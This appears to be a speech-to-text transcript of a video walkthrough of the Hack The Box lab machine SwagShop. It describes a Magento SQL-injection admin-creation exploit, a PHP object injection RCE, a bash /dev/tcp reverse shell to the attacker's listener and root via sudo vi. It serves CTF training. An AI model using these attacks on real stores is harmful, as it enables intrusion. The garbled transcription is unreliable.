 what's going on YouTube zipsak and we doin swag shop from hack the box which was a really fun box based around exploiting Magento which is an open source web application that allows people to create ecommerce sites to set up online stores to get user you have to modify to exploits the first exploit is a sequel injection that allows you to create a admin user to the Magento application and the second exploit is a PHP object injection that allows you to execute commands on the box once you get a shell on the Box you have sudo access with them so it's relatively easy to escalate up the root and then that's the Box at the end of the video we're gonna try to explain the PHP object injection a little bit more so with all that being said let's just jump in as always begin with an app so - SC for default scripts as via memory versions Oh a I'll put all format spin the nmap directory in : swag shot and then the IP address which is 10 10 10 140 this can take some time so I've already ran it looking at the results we have just two ports open the first one being SSH on port 22 and it's banner is telling us it's a Ubuntu server the version is for Ubuntu 2.8 which if we googled that we'd see this is Ubuntu zaniel not too important so let's just move on the next thing we have is HTTP on port 80 and it is running Apache and maps not really telling us all that much so let's just go poke at the website and see what is running going to 10 10 10 140 oh we have broke sweet on so let's just turn intercept off we get a page and the banner says Magento and I think a lot like Magento as they think about WordPress which is a content management system also known as CMS where WordPress helps you make websites about blogging Magento helps you make websites around shopping or a shopping cart so keeping that in mind we know it's a public product and I'm noticing when my mouse cursors over a link I'm seeing index.php slash and it's also got directories after that which is very odd so just clicking this we see index dot PHP slash if we went to like a cow well again we still see that exact behavior so I'm just gonna note this as interesting so going over to cherry tree control and to create a new node swag shop control shift and interesting paste and Y and X dot PHP and whenever I just run into issues or roadblocks I always go back to my interesting tab and see if something I took note of earlier helps me out and this could be interesting because if we went to just slash customer and got rid of this index dot PHP we get a 404 so this is indication that probably Apache mod rewrite which is a plug-in that rewrites URLs is misconfigured or not configured at all because we just see this typically it probably should rewrite index dot PHP to nothing and then these would be the value rels because that's what makes sense there's no reason to put index dot PHP in every single URL the other thing that I am noticing is way at the bottom of the page we see a copy rate from 2014 and the copyright generally reflects the last time a website has been updated some applications will have the copyright be dynamic which means it just pulls the system time and puts whatever year it is but if you see an old copyright chances are it's going to be old software so seeing 2014 puts me on the thought pattern I'm probably gonna want to look for public vulnerabilities see if there's any CVEs against this application in that time so my next step will be just to we'll see if there's a Magento application scanner similar to like WP scan so I'm gonna go to Google and let's just search like Magento code scan and just see what comes up from this maybe more abilities kay if nothing comes up but I do see a result to github and it's called major scan so let's grab this actually if we go down and look at the installation we can see it recommends downloading the packages out of the release so before I ever get anything out of releases in github I look at the last commit date which is February 12 and look at the day that the release file was if they're both within a reasonable amount of time on oh my grab the release file if like the release is a month plus out of date then I'll probably just compile it myself but seeing both of these are the same day I'm just gonna go ahead and download it and then before I install it I probably shouldn't on this first and just did like app search Magento and see if it's in Kali already doesn't look like it is so I'm gonna go just mainly copy it into my /opt so make Magento go in here and move it out of my downloads and then we can look at the usage instructions and we see PHP maich can defer scan : all and then the website so if we just run PHP mage can we can see all the options it has and I agree I want to run all the scans some do PHP mage confer scan scan : all weird way to say the argument but whatever will do HTTP 10 10 10 140 and I'm just going to put dash V because I kind of want to see what the verbosity it looks like not really showing that much there what if I do like two V's just always curious what the shell and nothing there three B's so we'll do no V's I always like seeing if a application is going to tell us every time it gets a web page because then we can get ideas of like how it found the version number and you can probably get that if we just go through the source code while that runs oh man bin mage can that's not it so so this logic you'll see how it gets source code you could try potentially going through burp suite and then looking at that way looking and source mage can check version PHP this is gonna have a URL it's telling us to get class file hash download so I'm not exactly sure how this code works but the results already done so let's just go over these so let's see we get the mage conversion so let's just copy this go over to this Magento version paste and then keep going down the list it is the Community Edition that's probably not too interesting no modules installed so if there's any like module exploits we can probably ignore it we got some patches sitemap.xml is not accessible I'm curious is this actually accessible so we'll copy it forget a firefox we know this won't work but what if we did index dot PHP sitemap.xml it doesn't work and we just get the generic 404 so definitely an accessible server technology we knew that and then unreachable path check so looking at this it's probably just going to all common Magento files and the first one we see is this app Etsy local dot XML so let's go try that out and we see this XML file oh nothing interesting there so let's see we got a crypt key could be interesting we got localhost for the my sequel root and the password so let's go to cherry tree go back and put creds and we want to take note of this so copy this you do this and label this as my sequel input like DB is equal to swag shop and since I'm using colons as separators punishing musical to separate the DB so moving on and don't really see anything else too interesting and see it was installed in 2019 which is funny because we got that 2014 copyright but oh well interesting and we can just put this install in fill maybe that's what it's called or maybe a configuration file would be a better thing but let's just move on and see what else we have we have RSS feed not too interesting /l that's definitely interesting so let's go check that page out 10 10 10 140 /l abstract compiler indexer so not too interesting whenever I see Cheryl I'm like has Ibsen pop before but in this case doesn't look like it VAR export let's see chances are this isn't going to show us anything if directory listings isn't enabled no we do get a directory listing and some CSV files open this with sheets and doesn't look interesting open the other one in sheets doesn't look interesting well there's the same file so I don't know keep going down by our export so nothing too interesting there so at this point I'm going to do a search boy Magento and see what is here 1.2 we can ignore because we are in version 1.9 2.0 I may come back to this one generally I like doing exploits that are the same major version the major version here being one because there's a lot of care that changed between probably version 1.0 and 2.0 but maybe like 1.0 and 1.1 may not be much of a code friends so that's the first thing I look for we see an exploit for 1.9 point 0.1 which is a version but it is authenticated so let's just go to cherry tree and put that there the next thing we have is a plugin we can kind of ignore this because Magento or mage scanner didn't have any plugins found we have local file disclosure remote code execution so let's check these two out so search point dash X and looking at this looks like XML and E injection and doesn't have anything to do on how to exploit this like what very well maybe this post request than this but as I was scrolling through the page I saw something that makes me want to ignore this we look at the vendor contact timeline 2012 the copyright was 2014 so we can ignore that so let's move on to the next one which is this code execution so do search point - X on this and we see the date 2015 so that is a great sign because this is just slightly after the day that a year we have been installed or whatever but let's move on this exploit it's a Python web request looks like we will have to edit target it's going to this URL so we can check if this exists real quick so if we just go to and the reason our objective this exists because that's slash admin which I just want to see if like on authenticated users can hit this so go into this we get not found let's try putting index dot PHP and we kind of hit it does this redirect us to an intercept on go here let's just set it to repeater go straight to this admin page but maybe that does something maybe it doesn't sorry I just want to make sure we didn't get like a 403 because we try to access slash admin so this looks like a SQL type injection we have SQL here and it's doing insert statements here's a query let's see directive so if the exploit works it'll print worked a check says check slash admin with creds for me for me so I definitely want to go look at this more in depth we see query has this and the username and password and I always hate when I use exploits and leave the like account it creates because there's definitely bots that scan the internet for just potential credentials and re exploit them so in order to leave us not more vulnerable than we started let's or we're still gonna be more formal than we started cause we're creating an account but we'll be slightly less the username will be please subscribe and we'll put the pass rest thank you so what creates account please sub thank you and to help us in the future we will put it here and if I was reading a pen test report from pen testers at my company I noticed they do have default creds and an exploit they are and that's public I'd probably be a little bit upset so this is a Python script and I don't think it's gonna run with all these slashes we can try it but definitely not so you have to clean this up so it runs by removing invalid characters and let's see we can do target and we need to replace this with 10 10 10 140 Python or we can move this will call this create user PI Python create user and we get did not worked and that's not really a verbose error so what I want to do is make this go through a proxy so do proxy is equal to HTTP and that is going to be HTTP localhost 8080 and then let's go down to the request and after data we want to put proxies is equal to proxy and this will tell the Python script to go through our proxy listening on localhost 8080 which of course is burp suite so now when we run this we can intercept see the request is running if we wanted to we could like decode this so we can send this over to the decoder tab and see exactly what this base64 is and we just see the SQL injection it's doing a select and then doing be easy if we just read that in the code but I'm going back to repeater we get 404 not found so now we know why it didn't work because it couldn't find the page but if we did index dot PHP slash admin it probably would work so before I do that I just want to write in the script because if we do it in burp right now the user creates it may give us the false positive because it may error out just because the account existed so let's just do this first we can drop this request run this again and now I'm just going to click forward and we see it says worked created with the creds please sub and thank you so if we click this repeater tab what do we get looks like maybe the login page that is odd let's just see what this looks like because now I'm curious so we'll go to the proxy tab turn intercept on create a request to the server paste in what we're sending forward it and get ugly back so looks like the magic bytes to a PNG file which is an image I'm just going to I guess ignore this but going to terminal we see try logging in with the creds please sub and thank you so let's go to index dot PHP maybe a count login and if we try please sub thank you we get we must use an email address looking at this URL I see slash customer one of the common ones we saw before was admin and we even see salgas login panel before so let's try this please sub thank you and get logged in so we get incoming message Magento Live Europe 2018 let's see your web server is configured incorrectly as a result configuration files with sensitive information accessible from the outside so this is probably going to be the local XML I think that was index is up to date so it doesn't really get saying anything about like madhuri director not mod rewrite but besides the fact we can look at system and one of the ways that you used this box you should be vulnerable with this Magento connection manager but that was patched out because it was I guess an unintended thing so decided to remove that functionality the intended way to go through the box was to go back to search boy we just do search boy Magento we would see this Authenticator remote code execution so if we look at this one search point dash X we can see this is a way to execute code and now we have creds to do this this is a PHP object injection will kind of go into exactly what this is at the end of the video there is a good blog post that helps you understand this we do see just like a PHP see realized object and we're injecting the length of variable and then the PHP function which is system and we know we can if we call system with anything like bash it will execute it so the interesting thing here in this is we do see install date and says this needs to be the exact date from app Etsy local XML and that got me curious so let's do search boy - M to mirror it and let's just rename this to code exact I I just did this so we have syntax highlighting but I'm curious where it uses install date and we look we see this variable G H is the md5 sum of the payload and the install date and we get the hex digest so it looks like this is some way of doing like a signature it's using the install date as a secret and signing everything with that install date and signing I mean just combining the variable plus the install date and doing md5 sum against it but that's what that is so we know we have to edit this install date let's do that this even as kind and tells us we can use a proxy so I always like when scripts do that this needs to be the exact date from Etsy local XML so let's go back to this page app let's see local dot XML grabs a state and then we can do DW to eat words until we get to the end and then paste so target is one the argument is to where's the username and password username password looks like it's not um and arguments you have to manually add you let's just add username passwords configures so username was it please sub and thank you I think I made a camel case for thank you so let's look at great user thank yes I did so code exec should now be working so let's do Python code exact HTTP 10 10 10 140 and we want to run fast - see - - I carry it like this dev TCP 10 10 14 I think my IP is 3 M 3 what 9001 because let's go over 9000 and that should be good so let's NCL VMP 9001 if he confused by this I've just typed enough where I have it memorized you can just go to like reverse shell cheat sheet and look at a bunch of reverse shells like this payload all the things repository this probably pen test monkey that's helpful but bunch of things and no control is it Python 3 definitely on Python 3 no control matching name login password let's see what does it get the target so target 10 10 10 140 slash index oh this is create user the code exec okay I was on code exec so target we can try slash index dot PHP slash like that no control name matching slash so let's set this go through the proxy and see what's going on so set proxies to that oops wheat and I SEP dawn run this we get slash and then do nothing so if we do 10 10 10 140 index.php get slash do nothing something weirds going on target open target I don't see it really actually building a URL so I'm guessing this target thing we have to build the vulnerable web page and looking at the module mechanised this is like an add-on to the request module and what it does is kind of creates an automated browser so if we go all the way down here we can see when Nishal izing the object browser be are setting the proxy we set the handle robots false so this is going to tell it to ignore robots.txt I believe tell it to open this web page which is target and then search the source code of the web page for a login variable and since we don't see any of this on index dot PHP it doesn't know where this is and that's why why it's airing out so we know the page for login is slash admin so that's the next thing I'm going to test so let's oh god get out of this I hate when this happens there we go so let's go index dot PHP slash admin and now it is hanging but is that because a burp burp is set to index intercept on click forward there we go we're getting this so now it's logging in now we're getting a index key so we're going to the page going to a page going to a age so it's definitely working now we go we got no object type group well I'm this again doesn't look like the exploit is working still if we do admin / still not working code exact up PI so let's see open post go here doing that should work let's just try disabling the proxy for some reason if that is causing the issue that'd be bizarre but let's try simplifying a payload and sending no bad characters or do Who am I none type has group so let's go back through burp step through this I can by just do HTTP 3 so this is a last request it makes the response is a 200 ok with no data found let's see where's a login request make sure we login successfully so here we go we've logged in and everything looks good here so what is going on with our script well the first thing I'm noticing is I think I'm in mistake with the beginning the video when I did this mage scan dot far I created the directory opt Magento when I've been working out of it so let's fix this issue real quick we'll move this to mage can and then we can move star dot pi to htb boxes swag shop and then go in this directory continue working out of here so Oh create user of course that works so the issue is when we do the code exec so we do slash admin like that Who am I and we get a failure still so let's do a little bit of debugging so let's edit this again and I forgot we probably should look at the error message and that is on line 69 Tunnel dot and Group 1 so this looks like it's probably using the regular expression module guy has no attribute group and this none type I guess if I read this error more looks like the regular expression search we're trying to do is coming back with absolutely nothing so we can easily verify this by either going through burp and stepping through it but I did that once before it dint stand out right away so I'm gonna do it my other method I'm gonna import PDB I'm gonna go to wine 70 because I just created a line and we can see that is right here so I'm going to do PDB dot set underscore trace like this and then we want to look at what this tunnel variable is and tunnel is going to be the output of this request so save this Python code exec do it with the same arguments and now if we print tunnel we get nothing so we have confirmed this variable is empty and going through this we're looking through block tab orders period and 7d probably seven days so let's do seven years or actually keep it consistent with the videos nine thousand one days so let's try this run this code again and it's show drop is here if we print tunnel we still get none weird let's try maybe we'd overflowed it let's do seven why four years do this again Brett tunnel none so we're gonna still air out so maybe this isn't it let's go to a small period one year tunnel there we go we actually got a hit here so this is good if we print ton old group one we can see the regular expression result what it was looking for it's looking for this URL we can continue this and it hangs let's see and then eventually displays or username so here we go we have it working so let's do control order reverse search or history and I'm going to search for a bash - see and we're going to try this again and I should remove the debug but we'll just do C to continue and nothing so let's simplify this a little bit let's not do this nested bash the thing just try this continue I really want to remove this so let's see where's this trace we can just comment this out and now it is just a matter of getting our syntax right I think that's the way to do the bash of our shell let's see control F dev TCP - I 1010 14 3 9001 that is correct let's just try like a common port like 4 4 3 and let's see please work does not try putting it in double quotes I doubt that will do anything and we can also try the next thing single quartz around here and just reversing the quotes we had earlier - Jessie see if this works there we go so I just have the quartz wrong I guess the rule of thumb is one of you do like nested quotes always do the single quote around the thing that is more complex so what I'm guessing happened is I had a single quote here so my computer did not interpret all this stuff and then the double quote here and the double quote interprets things so like if you do all do if SEC equals please support me on patreon we let go hip sack we see that we echo up second single quotes we get the variable and double quotes we get what the variable means so probably when it was getting to the actual remote host it's all the double quotes and then interpreted this these special characters weirdly but doing in the single quotes told it not to interpret them weirdly and to interpret them how we meant which may be weird in itself but it worked and we got the show so hopefully that makes sense the first thing I always do let's do Python - C and for PT y PT y dot spawn and - I don't know why sometimes I just forget that we don't have Python but we do have Python 3 import PT y PT y dot spawn and - and then s TTY roll - echo F G and you won't see hitting F G but just hit enter twice after that and you got the show and you can do is up down and whatnot so the very first thing I'm going to do Cherrytree go to my creds that we got a long time ago and look at this password so much I ask you - paste the password don't get anything if we do sudo - l2 list things we can use with sudo we can see right away that we can run VI and edit anything in verb dub dub HTML as root so we should be able just do like sudo V I've dubbed up dub HTML please support me on patreon and then exclamation point will execute commands Bend bash and we have rooted the box and I just did that method with VI because I know it but there is a we didn't know that and root our text is pretty big because well there's that I'll have to edit that stupid flag right here but there was a message in this that when the box first launched this was how you access the store on hack the box and you could actually purchase stickers a shirt and something else I believe but there's open up for everyone so that's why I wrote a text was bigger I was saying something before what was I saying it's clear this real quick I guess I'll have to do more editing cuz I didn't set term is equal to X term which was let me do ctrl well to clear but I was saying something though if I didn't know off top my head that I could execute commands within that V terminal I would have been going to GTFO bins and if you type VI we can see how to do it we could have just done Vig like this instead of getting into VI so if we do pseudo VI dub dub dub HTML test and then that - see we pop it that way it's essentially the same thing but soon as it opens up in VI it executes that - C command so before we end the video the one thing I want to get into is this code execution because this looks a lot like magic when you send this object so let's get into a little bit of how this was created so researching this I didn't know much about PHP object injection I still don't know a whole lot but we'll step through what I can I went to the creators blog so let's head code exact and we will go here and see if you wrote about this exploit and it looks like the very first post or his latest post is from this exploit he talks about it a little bit he had exploit it through a cross-site request forgery attack first and then forced someone to navigate to that page so he didn't have credentials he got someone to click a link and from that link they exploited it but we had credentials so we could just exploit it directly if we go here he talks about it he recommends going to Johanna's dots I think is how you say his name and reading his write-up because he is a really talented PHP guy he created PHP rips which is the PHP static code analyzer and there is a paid version of that it was open-source at one time but the paid version is much much better but anyways has this one post talking about it and essentially it's a PHP dear serialization on serialization vulnerability goes through it all and talks about the gadgets where's his example source I'd highly recommend reading this so we can copy his source code that he put here and let's go them we'll call this P or C dot php' paste the code and we have to put PHP tags around it so we can execute this and we do PHP PRC dot PHP we get this base64 we get GA and whatnot let's just edit this we only want to echo be 64 he's echoing the variables but as you remember you have to sign it with that hash but for our purposes we don't want to do that we just want this base64 gonna do base64 - D and get the variable and this looks very familiar so it went from all of this to what you saw there so what this exploit is doing is there is a unseal as functionality within that slash admin page and you're passing it a variable so if we go all the way back to burp if we look at Oh God stop loading pages well we can why do 10 10 10 140 good things here okay so let's see good our last request this tunnel page uncie realizes the GA parameter so this is what uncivilized the object and what this code does is it creates a PHP object that is using this class which will call the backend database and back-end database is going to create a data table labeled our code and ripps store data true and then this also has to call the MySQL PDO I forget what PDO stands for now but cause that which is this function this function is going to call this template simple which does truncate table on rips and that's going to provide the data for this filter command and on the blog filter is actually doing a Fred maybe it's called preg replace the P reg replace it's a box we had done a long time ago with that but it was like P reg replace and then you did the regular expression like that for search replace with and then have like that G it had the e on the end which meant it would actually execute code in this regular expression function and that's what this filter gadget does so this filter gadget is calling a regular expression on this data table because it got the information from this filter template simple and the regular expression execute code because that's the PHP variable do system ID and our Piercy it was system and then the bash - I whatever so if we go back to his page maybe we can show that real quick but before I do I'm going to turn purp sweet off we can probably just undo close tab and he should step through it so let's see we can just search for I will search for filter go to the very top and search for filter once I understand PHP D civilization more I may create a video just upon it because D civilization attacks are pretty cool so here he says filter is calling P rag replace and it has the eval modifier so here's that filter function and then P regular place efore eval function so although all these are just a pop chain to get to the vulnerable function and set up the stack on PHP so hopefully that made sense if not hopefully you understand PHP object injection and kind of held this magic is or how you create this magic and you create it by writing PHP and doing the serialize function as you see base64 encode serialize the object and whenever you see serialization attacks you generally see the exploit script written and the same exact language as ec relation serialization attack because you just have access to native functionality so with all that being said that's why I'm gonna end the video I hope you guys enjoyed it take care and I'll see you all next week